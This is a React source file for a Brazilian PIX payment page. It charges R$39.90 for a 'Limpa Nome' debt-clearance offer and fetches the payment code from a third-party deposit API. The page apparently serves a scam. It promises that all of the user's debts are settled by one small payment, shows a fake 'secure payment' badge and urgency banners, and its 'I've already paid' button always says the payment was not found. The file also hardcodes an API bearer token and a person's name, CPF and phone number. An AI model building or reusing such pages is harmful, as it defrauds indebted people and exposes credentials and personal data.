import { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
// CORRIGIDO: Removido 'AlertTriangle' que estava quebrando o build.
import { Copy, QrCode, CheckCircle2, HelpCircle, ChevronDown, AlertCircle, Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { TrustBadge } from "@/components/TrustBadge";
import { toast } from "sonner";
import {
  Collapsible,
  CollapsibleContent,
  CollapsibleTrigger,
} from "@/components/ui/collapsible";
import { Skeleton } from "@/components/ui/skeleton";
// REMOVIDO: qrcode.react (estava quebrando o build)

// Token da API (como solicitado, está aqui para testes)
const API_TOKEN = "298|TFk8AllUCxCBnb3aM7mYJX4RGe9UBHv3uy2KSfbO4c130b92";
const API_URL = "https://virtualpay.online/api/v1/transactions/deposit";
const PIX_EXPIRATION_MS = 10 * 60 * 1000; // 10 minutos

export default function Payment() {
  const navigate = useNavigate();
  const [pixCopied, setPixCopied] = useState(false);
  
  // States para o PIX dinâmico
  const [isLoadingPix, setIsLoadingPix] = useState(true);
  const [pixCopyPaste, setPixCopyPaste] = useState(""); // Começa vazio
  
  // Dados do usuário (fixos, conforme solicitado)
  const userName = "PEDRO HENRIQUE COSTA SOUSA";
  const userCpf = "111.097.675-52";
  const userWhatsApp = "(73) 99927-6645";
  const paymentAmount = "39.90";

  // ADICIONADO: Ref para guardar o timer
  const pixTimerRef = useRef<NodeJS.Timeout | null>(null);

  useEffect(() => {
    // Apenas verifica se a sessão existe
    const userData = sessionStorage.getItem("userData");
    const whatsapp = sessionStorage.getItem("whatsapp");
    if (!userData || !whatsapp) {
      navigate("/");
      return;
    }

    // Função para buscar os dados do PIX na API
    const generatePix = async () => {
      console.log("Gerando novo PIX...");
      setIsLoadingPix(true);
      setPixCopyPaste(""); // Limpa o PIX anterior
      
      // Limpa timer anterior, se existir
      if (pixTimerRef.current) {
        clearTimeout(pixTimerRef.current);
      }

      try {
        const sessionData = JSON.parse(sessionStorage.getItem("userData") || "{}");
        const name = sessionData.name || userName;
        const document = (sessionData.cpf || userCpf).replace(/\D/g, "");

        const response = await fetch(API_URL, {
          method: "POST",
          headers: {
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Authorization": `Bearer ${API_TOKEN}`,
          },
          body: JSON.stringify({
            name: name,
            description: "Quitação de Dívidas - Limpa Nome",
            document: document,
            amount: paymentAmount,
          }),
        });

        if (!response.ok) {
          const errorData = await response.json();
          console.error("Erro da API:", errorData);
          throw new Error("Falha ao gerar o PIX. Tente novamente.");
        }

        const data = await response.json();
        
        // Salva o CÓDIGO (copia e cola)
        setPixCopyPaste(data.qr_code);

        // ADICIONADO: Agenda a próxima geração de PIX
        pixTimerRef.current = setTimeout(generatePix, PIX_EXPIRATION_MS);

      } catch (error) {
        console.error(error);
        toast.error("Erro ao gerar PIX", {
          description: "Não foi possível gerar o PIX. Por favor, atualize a página e tente novamente.",
        });
        setPixCopyPaste("Erro ao gerar código.");
      } finally {
        setIsLoadingPix(false);
      }
    };

    generatePix(); // Gera o PIX na primeira carga
    
    // ADICIONADO: Limpa o timer quando o componente é desmontado
    return () => {
      if (pixTimerRef.current) {
        clearTimeout(pixTimerRef.current);
      }
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [navigate]); // Dependência de navegação está ok

  const handleCopyPix = () => {
    // CORRIGIDO: Lógica do botão
    if (isLoadingPix || !pixCopyPaste || pixCopyPaste.startsWith("Erro")) return;
    
    navigator.clipboard.writeText(pixCopyPaste);
    setPixCopied(true);
    toast.success("PIX copiado! Abra seu app e cole para pagar.", {
      duration: 3000,
    });
    setTimeout(() => setPixCopied(false), 3000);
  };
  
  // ALTERADO: Adicionado handler para botão "Já paguei"
  const handleCheckPayment = () => {
    toast.error("Pagamento não identificado", {
      description: "Seu pagamento ainda não foi confirmado. Por favor, aguarde alguns minutos e tente novamente.",
      duration: 4000,
    });
  };
  
  // Define se o PIX está em um estado válido
  const isPixValid = !isLoadingPix && pixCopyPaste && !pixCopyPaste.startsWith("Erro");

  return (
    <div className="min-h-screen bg-background py-6 md:py-12 px-4">
      <div className="max-w-2xl mx-auto space-y-6 md:space-y-8">
        {/* Header */}
        <div className="text-center space-y-4 animate-slide-up">
          <div className="inline-block px-4 py-2 bg-warning rounded-full mb-2">
            <p className="text-xs md:text-sm font-bold text-foreground">🎯 Oferta Especial de Novembro</p>
          </div>
          
          <h1 className="text-2xl md:text-4xl font-bold text-foreground mb-2">
            {userName.split(" ")[0]}, confirme as informações e
            <br />
            finalize o pagamento abaixo
          </h1>
        </div>

        {/* User Confirmation */}
        <div className="bg-card rounded-xl shadow-lg p-4 md:p-6 border border-border animate-slide-up">
          <h3 className="text-lg font-bold text-foreground mb-4 flex items-center gap-2">
            <CheckCircle2 className="w-5 h-5 text-success" />
            Confirme seus dados
          </h3>
          <div className="space-y-2 text-sm md:text-base">
            <div className="flex justify-between py-2 border-b border-border">
              <span className="text-muted-foreground">Nome:</span>
              <span className="font-semibold text-foreground">{userName}</span>
            </div>
            <div className="flex justify-between py-2 border-b border-border">
              <span className="text-muted-foreground">CPF:</span>
              <span className="font-semibold text-foreground">{userCpf}</span>
            </div>
            <div className="flex justify-between py-2 border-b border-border">
              <span className="text-muted-foreground">WhatsApp:</span>
              <span className="font-semibold text-foreground">{userWhatsApp}</span>
            </div>
          </div>
          <div className="mt-4 p-5 bg-success/10 rounded-lg border-2 border-success/30">
            <p className="text-lg md:text-xl text-foreground font-bold text-center">
              ✓ Todas as suas dívidas serão quitadas por este valor único
            </p>
          </div>
        </div>

        {/* Urgency Alert */}
        <div className="bg-secondary/10 border-2 border-secondary rounded-xl p-6 md:p-8 animate-slide-up">
          <div className="text-center space-y-4">
            <AlertCircle className="w-10 h-10 md:w-12 md:h-12 text-secondary mx-auto" />
            {/* ALTERADO: Texto do alerta (removido '⚠') */}
            <p className="font-bold text-foreground text-xl md:text-2xl">
              Finalize o pagamento abaixo no valor
            </p>
            <p className="text-6xl md:text-7xl font-bold text-primary">
              R$ 39,90
            </p>
          </div>
        </div>

        {/* PIX Payment Card */}
        <div className="bg-card rounded-2xl shadow-xl p-6 md:p-8 space-y-6 border border-border animate-slide-up">
          
          {/* REVERTIDO: QR Code Estático */}
          <div className="bg-muted rounded-xl p-6 md:p-8 flex items-center justify-center">
            <div className="text-center space-y-4">
              <div className="inline-flex items-center justify-center w-40 h-40 md:w-48 md:h-48 bg-card rounded-xl border-2 border-border">
                {isLoadingPix ? (
                   <div className="flex flex-col items-center gap-4 text-muted-foreground">
                    <Loader2 className="w-12 h-12 animate-spin" />
                    <span className="font-semibold">Gerando PIX...</span>
                  </div>
                ) : (
                  <QrCode className="w-28 h-28 md:w-32 md:h-32 text-muted-foreground" />
                )}
              </div>
              <p className="text-xs md:text-sm text-muted-foreground">Escaneie o QR Code com seu app de pagamento</p>
            </div>
          </div>

          {/* PIX Copy-Paste */}
          <div className="space-y-4 text-center">
            {/* ALTERADO: Texto "PIX COPIA E COLA" maior (text-2xl) */}
            <p className="text-2xl font-semibold text-foreground">
              PIX COPIA E COLA
            </p>
            
            <div className="flex flex-col gap-3">
              {/* Caixa do código */}
              <div className="w-full bg-muted rounded-lg p-3 text-sm text-muted-foreground font-mono break-all text-left">
                {isLoadingPix ? (
                  <Skeleton className="h-5 w-full" />
                ) : (
                  pixCopyPaste || "Erro ao gerar código. Atualize a página." // Mostra o PIX dinâmico ou erro
                )}
              </div>
              
              {/* ALTERADO: Botão "Copiar PIX" maior (text-4xl) */}
              <Button
                onClick={handleCopyPix}
                size="lg"
                className="w-full bg-primary hover:bg-primary-hover font-bold transition-all duration-300 text-4xl h-auto py-5" // text-4xl
                // CORRIGIDO: Lógica do disabled
                disabled={!isPixValid}
              >
                {pixCopied ? (
                  <>
                    <CheckCircle2 className="w-9 h-9 mr-3" /> {/* Ícone maior */}
                    Copiado!
                  </>
                ) : (
                  <>
                    <Copy className="w-9 h-9 mr-3" /> {/* Ícone maior */}
                    Copiar PIX
                  </>
                )}
              </Button>
            </div>
          </div>

          {/* Trust Badges */}
          {/* ALTERADO: Apenas 1 badge "Pagamento seguro" centralizado */}
          <div className="flex justify-center gap-3 pt-4 border-t border-border">
            <TrustBadge variant="security" text="Pagamento seguro" />
          </div>

          {/* Benefits */}
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 md:gap-4 pt-4">
            <div className="text-center p-3 md:p-4 bg-success/5 rounded-lg border border-success/20">
              <CheckCircle2 className="w-5 h-5 md:w-6 md:h-6 text-success mx-auto mb-2" />
              <p className="text-xs md:text-sm font-medium text-foreground">Liberação automática</p>
            </div>
            <div className="text-center p-3 md:p-4 bg-success/5 rounded-lg border border-success/20">
              <CheckCircle2 className="w-5 h-5 md:w-6 md:h-6 text-success mx-auto mb-2" />
              <p className="text-xs md:text-sm font-medium text-foreground">Consulta imediata</p>
            </div>
          </div>
        </div>

        {/* How to Pay Tutorial */}
        <Collapsible className="bg-card rounded-xl shadow-lg border border-border animate-slide-up">
          <CollapsibleTrigger className="w-full p-6 flex items-center justify-between hover:bg-muted/50 transition-colors rounded-xl">
            <div className="flex items-center gap-3">
              <HelpCircle className="w-5 h-5 text-primary" />
              <span className="font-semibold text-foreground">Como pagar com PIX?</span>
            </div>
            <ChevronDown className="w-5 h-5 text-muted-foreground" />
          </CollapsibleTrigger>
          <CollapsibleContent className="px-6 pb-6">
            <ol className="space-y-3 text-sm text-muted-foreground">
              <li className="flex gap-3">
                <span className="font-bold text-primary">1.</span>
                <span>Abra o app do seu banco</span>
              </li>
              <li className="flex gap-3">
                <span className="font-bold text-primary">2.</span>
                <span>Selecione a opção PIX</span>
              </li>
              <li className="flex gap-3">
                <span className="font-bold text-primary">3.</span>
                <span>Cole o código copiado ou escaneie o QR Code</span>
              </li>
              <li className="flex gap-3">
                <span className="font-bold text-primary">4.</span>
                <span>Confirme o pagamento de R$ 39,90</span>
              </li>
              <li className="flex gap-3">
                <span className="font-bold text-primary">5.</span>
                <span>Pronto! A liberação é automática</span>
              </li>
            </ol>
          </CollapsibleContent>
        </Collapsible>

        {/* Action Button */}
        {/* ALTERADO: Adicionado onClick */}
        <div className="animate-slide-up">
          <Button 
            size="lg"
            className="w-full h-14 md:h-16 text-lg md:text-xl font-bold bg-success hover:bg-success/90"
            onClick={handleCheckPayment}
          >
            Já realizei o pagamento
          </Button>
        </div>
      </div>
    </div>
  );
}
